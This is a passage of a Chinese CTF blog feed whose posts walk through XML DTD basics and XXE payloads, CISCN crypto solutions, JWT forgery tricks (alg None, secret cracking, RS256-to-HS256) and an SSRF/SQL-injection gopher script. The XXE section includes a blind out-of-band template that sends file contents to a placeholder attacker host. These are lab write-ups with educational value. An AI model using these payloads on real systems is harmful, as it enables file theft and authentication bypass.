xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">note</span> <span class=\"token attr-name\">(to,from,heading,body)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">to</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">from</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">heading</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">body</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>如果采用外部 DTD 文档，那么将上面的内容写到 <code>note.dtd</code>  的话，即，有点类似于头文件的作用，变量声明</p>\n<p>note.dtd</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">note</span> <span class=\"token attr-name\">(to,from,heading,body)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">to</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">from</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">heading</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">body</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>那么原来的文件可以改为</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">note</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"note.dtd\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>note</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>to</span><span class=\"token punctuation\">&gt;</span></span>Tove<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>to</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>from</span><span class=\"token punctuation\">&gt;</span></span>Jani<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>from</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>heading</span><span class=\"token punctuation\">&gt;</span></span>Reminder<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>heading</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>Don't forget me this weekend!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>note</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><h3 id=\"dtd元素\"><a class=\"anchor\" href=\"#dtd元素\">#</a> DTD 元素</h3>\n<p>在一个 DTD 中，元素通过元素声明来进行声明。</p>\n<p><strong>声明一个元素</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">category</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">(element-content)</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>；例如</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">br</span> <span class=\"token attr-name\">EMPTY</span><span class=\"token punctuation\">&gt;</span></span>  表示空元素</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">(#PCDATA)</span><span class=\"token punctuation\">&gt;</span></span>  表示只有PCDATA的元素</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">ANY</span><span class=\"token punctuation\">&gt;</span></span>        带有任何内容的元素</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">(child1)</span><span class=\"token punctuation\">&gt;</span></span> 或  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">(child1,child2,...)</span><span class=\"token punctuation\">&gt;</span></span>   带有子序列的元素</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>等等</pre></td></tr></tbody></table></figure><h3 id=\"dtd属性\"><a class=\"anchor\" href=\"#dtd属性\">#</a> DTD 属性</h3>\n<p>在 DTD 中，属性通过 ATTLIST 声明来进行声明。</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ATTLIST</span> <span class=\"token attr-name\">element-name</span> <span class=\"token attr-name\">attribute-name</span> <span class=\"token attr-name\">attribute-type</span> <span class=\"token attr-name\">attribute-value</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>DTD 实例:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ATTLIST</span> <span class=\"token attr-name\">payment</span> <span class=\"token attr-name\">type</span> <span class=\"token attr-name\">CDATA</span> <span class=\"token attr-name\">\"check\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>XML 实例:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>payment</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>check<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr></tbody></table></figure><h3 id=\"dtd实体\"><a class=\"anchor\" href=\"#dtd实体\">#</a> DTD 实体</h3>\n<p>类似于变量的定义，可以使用 <code>&amp;name</code>  进行引用</p>\n<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>DTD 实例:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">writer</span> <span class=\"token attr-name\">\"Donald</span> <span class=\"token attr-name\">Duck.\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">copyright</span> <span class=\"token attr-name\">\"Copyright</span> <span class=\"token attr-name\">runoob.com\"</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>XML 实例：</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>author</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token entity named-entity\" title=\"&amp;writer;\">&amp;writer;</span>&amp;copyright;<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>author</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><h2 id=\"xxe漏洞\"><a class=\"anchor\" href=\"#xxe漏洞\">#</a> XXE 漏洞</h2>\n<h3 id=\"有回显\"><a class=\"anchor\" href=\"#有回显\">#</a> 有回显</h3>\n<p>直接将文件地址写出，然后显示即可</p>\n<p>如</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">root</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">&lt;!ENTITY file SYSTEM \"file:///D://1.txt\"&gt;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>root</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token entity named-entity\" title=\"&amp;file;\">&amp;file;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>root</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><h3 id=\"无回显\"><a class=\"anchor\" href=\"#无回显\">#</a> 无回显</h3>\n<p>无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据</p>\n<p>先使用 php://filter 获取目标文件的内容，然后将内容以 http 请求发送到接受数据的服务器来读取数据。</p>\n<p>payload</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=D:/1.txt\"&gt;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;!ENTITY % dtd SYSTEM \"http://xxx.xxx.xxx.xxx/evil.xml\"&gt;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>%dtd;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>%send;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></pre></td></tr></tbody></table></figure><p>evil.xml</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;!ENTITY % payload \"&lt;!ENTITY <span class=\"token entity\" title=\"%\">&amp;#x25;</span> send SYSTEM 'http://xxx.xxx.xxx.xxx/?content=%file;'&gt;\"&gt; %payload;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//%号要进行实体编码成&amp;#x25</pre></td></tr></tbody></table></figure><p>监控日志再 base64 解码就是外带出来的数据</p>\n<p>简单解释一下：其实就是连续调用了 三个参数实体（% dtd，% payload，% file），</p>\n<p>先 % dtd 请求远程服务器（攻击机）上的 evil.xml，然后 % payload 调用了 % file ，% file 获取对方服务器上的敏感文件，最后替换 % send，数据被发送到我们远程的服务器，就实现了数据的外带</p>\n<p>两种参考模板</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY % file SYSTEM \"file:///c://test/1.txt\"&gt;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt; </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>%dtd; %all; </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>value</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token entity named-entity\" title=\"&amp;send;\">&amp;send;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>value</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>evil.xml文件内容为</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;\"&gt;</pre></td></tr></tbody></table></figure><figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">root</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=c:/test/1.txt\"&gt;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>%dtd;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>%send;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&gt;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>root</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>root</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>evil.xml文件内容为：</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>&lt;!ENTITY % payload \"&lt;!ENTITY <span class=\"token entity\" title=\"%\">&amp;#x25;</span> send SYSTEM 'http://localhost:88/?content=%file;'&gt;\"&gt; %payload;</pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "web",
                "XXE"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/3f9caa7c/",
            "url": "http://dpm12345.cn/posts/3f9caa7c/",
            "title": "2022ciscn",
            "date_published": "2023-06-10T12:15:40.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"签到电台\"><a class=\"anchor\" href=\"#签到电台\">#</a> 签到电台</h2>\n<p>根据公众号给出的提示，得到了 “弼时安全到达了” 所对应的 7 个电码：</p>\n<p>1732 2514 1344 0356 0451 6671 0055</p>\n<p>知道是要从密码表截取前 28 位，每位相加然后模除以 10，加不进位，减不借位</p>\n<p>访问题目中的密码本 (应该不是唯一的)，得到密码本数字形式，然后编写代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token string\">\"1284683471560012137323347563938960841270469827366977500196640227941488448145897061841685191437684841119472109545934488885156171671993203375440354577656740329709619670665414032766626359844634630934599849134748530511184845463803767779616315360123277646772394938151789063860995163647777792137876650152636001627761020415317881961532438857008239094959088216460909214888315796229117908997790669101643964602287249240028873946674862423569188143490016408265512470104752732003296551760935140476083726165638433195194685432776534485956790061\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"1732251413440356045166710055\"</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ans <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    ans <span class=\"token operator\">+=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 2916834884900368172489057518</span></pre></td></tr></tbody></table></figure><p>然后抓包提交即可</p>\n<h2 id=\"基于挑战码的双向认证\"><a class=\"anchor\" href=\"#基于挑战码的双向认证\">#</a> 基于挑战码的双向认证</h2>\n<p><code>find / | grep flag</code></p>\n<p>可以发现两条 flag</p>\n<p><img data-src=\"./../../post_images/2022ciscn/%E6%8C%91%E6%88%98%E7%A0%811.png\" alt=\"挑战码1\"></p>\n<p>分别 cat，得到</p>\n<pre><code>//flag1.txt\nflag{cde68814-f2b0-4ae2-b23e-b67213476da2}\n//flag2.txt\nflag{34f5fdaf-c373-47fd-afab-01ed2914c11a}\n</code></pre>\n<p>提交 flag1 即为此题 flag</p>\n<h2 id=\"基于挑战码的双向认证2\"><a class=\"anchor\" href=\"#基于挑战码的双向认证2\">#</a> 基于挑战码的双向认证 2</h2>\n<p>上题得到的第二个 flag 就是</p>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h1>\n",
            "tags": [
                "CTF",
                "ciscn"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/8d17cdf0/",
            "url": "http://dpm12345.cn/posts/8d17cdf0/",
            "title": "jwt",
            "date_published": "2023-05-31T17:12:40.000Z",
            "content_html": "<h1 id=\"JWT-简介\"><a href=\"#JWT-简介\" class=\"headerlink\" title=\"JWT 简介\"></a>JWT 简介</h1><h1 id=\"web-345\"><a href=\"#web-345\" class=\"headerlink\" title=\"web 345\"></a>web 345</h1><p>在cookie里找到auth，然后将其放到jwt.io解码，可以得到一堆信息，可以发现签名算法为None，因此不需签名认证</p>\n<p>根据原题目源代码的提示admin，试着将<code>sub:'user'</code>改为admin用户，将新生成的cookie复制到cookie里，然后访问<code>/admin</code>得到flag</p>\n<h1 id=\"web-346\"><a href=\"#web-346\" class=\"headerlink\" title=\"web 346\"></a>web 346</h1><p>相比于签名的，有签名算法了，但可以按上面一题一样，将算法改为None，然后山区签名结果，这样可以访问到flag</p>\n<h1 id=\"web-347\"><a href=\"#web-347\" class=\"headerlink\" title=\"web 347\"></a>web 347</h1><p>根据题目的弱口令，可以爆破或者弱口令尝试分别使用</p>\n<p>计算爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy\">c-jwt-cracker</span><del>自己试跑了好久也没成</del></p>\n<p>字典爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9qd3QtaGFjaw==\">jwt-hack</span></p>\n<p>跑出来密码是<code>123456</code>，然后到<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\">jwt.io</span>encode生成cookie即可</p>\n<p>然后复制修改cookie值，访问<code>/admin/</code></p>\n<h1 id=\"web-348\"><a href=\"#web-348\" class=\"headerlink\" title=\"web 348\"></a>web 348</h1><p>同上一题，得到密码为<code>aaab</code></p>\n<h1 id=\"web-349\"><a href=\"#web-349\" class=\"headerlink\" title=\"web 349\"></a>web 349</h1><p>根据给的<code>app.js</code>，分别访问<code>/public.key</code>和<code>/private.key</code>获得公私钥文件</p>\n<p>然后放到jwt.io网站上生成cookie(原题目给的私钥大小不是2048位的，不能生成)</p>\n<p>这里采用的是<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXZVNHkxODdIRS8=\">ctfshow jwt视频</span>的自建环境生成cookie</p>\n<p>要注意的是，新版本的jsonwebtoken(9.0.0)可能会报错</p>\n<p><code>secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code></p>\n<p>查询相关资料后，可以下载8.5.1版本的jsonwebtoken，<code>npm install jsonwebtoken@8.5.1 --save</code>,然后生成后复制cookie替换，最后post访问网站</p>\n<h1 id=\"web-350\"><a href=\"#web-350\" class=\"headerlink\" title=\"web 350\"></a>web 350</h1><p>相比于上题，只能获得公钥，但可以通过<code>RS256 -&gt; HS256</code>是验证算法改变</p>\n<pre><code>HS256算法使用密钥为所有消息进行签名和验证。\n\n而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。\n\n如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。\n\n由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。\n\n这样的话，后端代码使用RSA公钥+HS256算法进行签名验证\n</code></pre>\n<p>按照上题的构造方法生成cookie即可</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/1c49b73d/",
            "url": "http://dpm12345.cn/posts/1c49b73d/",
            "title": "XCTF",
            "date_published": "2023-05-29T02:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"very-easy-sql\"><a href=\"#very-easy-sql\" class=\"headerlink\" title=\"very_easy_sql\"></a>very_easy_sql</h2><p>一道结合SSRF的SQL注入题</p>\n<p>首先进入网址，看到</p>\n<p><img data-src=\"/../../post_images/XCTF/very_easy_sql_1.png\"></p>\n<p><code>you are not an inner user, so we can not let you have identify~</code>的语句，说明需要的是以内部身份访问内部网站</p>\n<p>查看源码，可以观察到<code>use.php</code>的注释</p>\n<p><img data-src=\"/../../post_images/XCTF/very_easy_sql_2.png\"></p>\n<p>按照提示，访问该地址，得到以下界面</p>\n<p><img data-src=\"/../../post_images/XCTF/very_easy_sql_3.png\"></p>\n<p>可以想到为SSRF，首先输入<code>127.0.0.1</code>，得到</p>\n<p><img data-src=\"/../../post_images/XCTF/very_easy_sql_4.png\"></p>\n<p>可以知道成功，</p>\n<p>这时使用弱密码进行登录，使用以下代码生成gopher内容</p>\n<pre><code class=\"python\">import urllib.parse\nimport base64\n\nhost = \"127.0.0.1:80\"\ncontent = \"uname=admin&amp;passwd=admin\"\ncontent_length = len(content)\n\n\ntest =\\\n\"\"\"POST /index.php HTTP/1.1\nHost: {}\nUser-Agent: curl/7.43.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nContent-Length: {}\n\n{}\n\n\"\"\".format(host,content_length,content)\n\ntmp = urllib.parse.quote(test)\nnew = tmp.replace(\"%0A\",\"%0D%0A\")\nresult = urllib.parse.quote(new)\nprint(\"gopher://\"+host+\"/_\"+result)\n</code></pre>\n<p>得到<code>gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A%250D%250A</code></p>\n<p>然后对此进行抓包，可以看到有<code>Set-Cookie</code>这一项<code>this_is_your_cookie=YWRtaW4%3D</code></p>\n<p><img data-src=\"E:\\blog\\source\\素材\\XCTF\\very_easy_sql_5.png\"></p>\n<p>对此进行url解码和base64解码后，可以得到<code>YWRtaW4%3D</code>即为<code>admin</code>,与输入的账户相同，猜测这里为注入点</p>\n<p>对此进行尝试，编写以下代码</p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-05-29 11:17:34\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-05-29 13:03:21\nDescription  : \n'''\nimport urllib.parse\nimport base64\n\nhost = \"127.0.0.1:80\"\n\npayload = \"admin'\"\ncookie_base64 = base64.b64encode(payload.encode()).decode()\nprint(cookie_base64)\ncookie = \"this_is_your_cookie={}\".format(cookie_base64)\n\ntest =\\\n\"\"\"POST /index.php HTTP/1.1\nHost: {}\nUser-Agent: curl/7.43.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nCookie: {}\n\n\"\"\".format(host,cookie)\n\n\ntmp = urllib.parse.quote(test2)\nnew = tmp.replace(\"%0A\",\"%0D%0A\")\nresult = 